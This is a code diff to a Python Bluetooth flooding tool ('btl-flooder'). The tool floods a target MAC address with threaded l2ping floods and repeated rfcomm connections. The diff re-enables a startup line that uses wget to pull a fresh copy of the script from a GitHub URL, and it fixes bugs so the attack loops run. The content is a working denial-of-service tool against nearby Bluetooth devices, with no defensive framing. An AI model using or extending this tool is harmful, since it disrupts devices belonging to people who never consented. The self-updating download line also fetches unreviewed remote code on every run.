@@ -4,15 +4,16 @@ import sys
 import subprocess
 import time
 import threading
-#print("updated")
-#os.system("wget https://raw.githubusercontent.com/widow9098-dev/btl-flooder/main/main.py > flooder.py")
+print("updated")
+os.system("wget https://raw.githubusercontent.com/widow9098-dev/btl-flooder/main/main.py > flooder.py")
 def run_cmd(command: str):
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
         return stdout.decode("utf-8")
 print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
 print("widow9098#0353")
-cmd = sys.argv[1] or ""
+try: cmd = sys.argv[1]
+except: cmd = ""
 if (cmd == "on"):
     print("hci0 up")
     hwus = run_cmd("hciconfig hci0 up")
@@ -36,7 +37,7 @@ else:
                 hwus = run_cmd("rfcomm connect %s 1 2>&1 >/dev/null" % (macadd)) 
                 print("sent packet to " + macadd + " size:700")
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
-        for i in range(treadnum):
+        for i in range(threadnum):
             threading.Thread(target = loopbacklrfcomm).start()
     elif (method == "l2ping"):
         def loopbacklping():
@@ -44,7 +45,7 @@ else:
                 hwus = run_cmd("sudo l2ping -i %s -s %s -f %s &" % ("hci0", 600, macadd)) 
                 print("sent packet to " + macadd + " size:700")
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
-        for i in range(treadnum):
+        for i in range(threadnum):
             threading.Thread(target = loopbacklping).start()
     elif (method == "pair"):
         def loopback():
